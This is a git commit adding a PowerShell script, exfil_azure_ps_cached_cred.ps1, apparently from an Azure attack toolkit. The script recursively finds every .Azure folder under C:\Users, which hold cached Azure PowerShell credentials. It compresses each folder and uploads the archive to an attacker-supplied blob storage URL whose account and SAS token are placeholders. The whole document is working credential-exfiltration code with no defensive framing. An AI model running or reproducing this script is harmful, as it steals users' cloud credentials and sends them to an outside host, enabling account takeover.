1eed463cc3ef93ad449e6faa31998251ffc09d97
David Okeyode <asegunlolu@hotmail.com>
2020-09-15 15:04:48 +0100

    Add files via upload

---
+++ exfil_azure_ps_cached_cred.ps1
@@ -0,0 +1,17 @@
+﻿$source = gci -Path "C:\Users" -Recurse -Filter ".Azure" -Directory
+$uri = "https://<storage_acct>/<container>/$($zip)<sas_token>"
+$count = 10
+$headers = @{
+    'x-ms-blob-type' = 'BlockBlob'
+}
+
+Foreach ($s in $source) {
+    $count
+    $count++
+    $Fullname = $s.FullName
+    $BaseName = $s.BaseName
+    $zip = "profile" + $count + ".zip"
+    $zipPath = $env:TEMP + "\" + $zip
+    Compress-Archive -Path $FullName -DestinationPath $zipPath
+    Invoke-RestMethod -Uri $uri -Method Put -Headers $headers -InFile $zipPath
+}
